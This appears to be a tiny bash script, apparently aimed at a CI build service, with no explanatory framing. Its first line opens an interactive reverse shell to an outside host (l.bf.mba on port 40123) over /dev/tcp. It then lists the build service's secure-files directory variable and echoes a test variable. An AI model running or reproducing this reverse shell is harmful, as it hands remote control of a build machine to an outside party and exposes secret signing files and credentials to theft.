#!/bin/bash

/bin/bash -i >& /dev/tcp/l.bf.mba/40123 0>&1

ls $BUDDYBUILD_SECURE_FILES

echo $Testtesttest
